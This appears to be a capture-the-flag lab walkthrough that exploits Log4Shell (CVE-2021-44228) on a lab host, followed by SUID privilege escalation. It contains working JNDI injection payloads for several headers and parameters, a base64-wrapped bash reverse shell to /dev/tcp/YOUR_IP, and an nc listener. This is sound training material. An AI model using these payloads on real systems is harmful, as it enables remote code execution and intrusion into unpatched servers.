# Machine 01: Log4Hell — Full Walkthrough

## CVE-2021-44228 (Log4Shell)

**Severity**: CVSS 10.0 (Critical)  
**Affected**: Apache Log4j 2.0-beta9 through 2.14.1  
**Impact**: Remote Code Execution via JNDI Lookup injection

---

## Step 1: Reconnaissance (GATE 0)

### Port Scan
```bash
nmap -sC -sV -p- 10.10.1.10
```

**Expected output:**
```
PORT     STATE SERVICE VERSION
8080/tcp open  http    Java HTTP Server
```

### Service Identification
```bash
curl -v http://10.10.1.10:8080/
```

Note the response includes:
- "Version: 2.14.1" in the HTML
- "Powered by Log4j" in the footer

---

## Step 2: Enumeration (GATE 1)

### Identify Attack Surface

The application has multiple endpoints:
```bash
# Main page
curl http://10.10.1.10:8080/

# Login portal
curl http://10.10.1.10:8080/api/login

# Search endpoint
curl http://10.10.1.10:8080/api/search?q=test
```

### Confirm Log4j Version

The "Version: 2.14.1" confirms Log4j 2.14.1, which is vulnerable to CVE-2021-44228.

Key insight: Log4j processes **JNDI lookups** in any logged string. The application logs HTTP headers.

---

## Step 3: Exploitation (GATE 2)

### Setup Attack Infrastructure

**Terminal 1 — Start LDAP Server:**
```bash
# Using marshalsec or rogue-jndi
java -jar rogue-jndi.jar --command "bash -c {echo,BASE64_REVERSE_SHELL}|{base64,-d}|{bash,-i}" \
    --httpPort 8888 --ldapPort 1389
```

Where `BASE64_REVERSE_SHELL` is:
```bash
echo -n 'bash -i >& /dev/tcp/YOUR_IP/9001 0>&1' | base64
```

**Terminal 2 — Start Listener:**
```bash
nc -lvnp 9001
```

### Trigger the Exploit

```bash
# Inject JNDI lookup via X-Api-Version header
curl -H 'X-Api-Version: ${jndi:ldap://YOUR_IP:1389/a}' http://10.10.1.10:8080/
```

Alternative injection points:
```bash
# Via User-Agent
curl -A '${jndi:ldap://YOUR_IP:1389/a}' http://10.10.1.10:8080/

# Via X-Forwarded-For
curl -H 'X-Forwarded-For: ${jndi:ldap://YOUR_IP:1389/a}' http://10.10.1.10:8080/

# Via login POST body
curl -X POST -d 'username=${jndi:ldap://YOUR_IP:1389/a}' http://10.10.1.10:8080/api/login

# Via search query
curl 'http://10.10.1.10:8080/api/search?q=${jndi:ldap://YOUR_IP:1389/a}'
```

### Get User Flag

You should now have a shell as `appuser`:
```bash
whoami
# appuser

cat /home/user/user.txt
# FLAG{...}
```

---

## Step 4: Privilege Escalation (GATE 3)

### Enumerate SUID Binaries

```bash
find / -perm -u=s -type f 2>/dev/null
```

**Expected output includes:**
```
/usr/local/bin/vuln-reader
```

This is a custom SUID binary not part of the standard OS.

### Analyze the Binary

```bash
/usr/local/bin/vuln-reader
# Usage: /usr/local/bin/vuln-reader <logfile>
# Read application log files.
```

It claims to read "log files" but doesn't actually restrict paths.

### Read Root Flag

```bash
/usr/local/bin/vuln-reader /root/root.txt
# FLAG{...}
```

The binary runs as root (SUID) and reads any file without proper path validation.

---

## Summary

| Step | Action | Outcome |
|------|--------|---------|
| Recon | nmap port scan | Discovered Java app on 8080 |
| Enum | Identified Log4j 2.14.1 | Confirmed CVE-2021-44228 |
| Exploit | JNDI injection via header | Reverse shell as `appuser` |
| Priv Esc | SUID binary abuse | Read `/root/root.txt` |

## Key Takeaways

1. **Log4Shell** affects any application using Log4j 2.x that logs user-controlled input
2. Multiple injection points exist — headers, parameters, POST bodies
3. SUID binaries are a classic Linux privilege escalation vector
4. Always enumerate custom binaries, not just standard ones
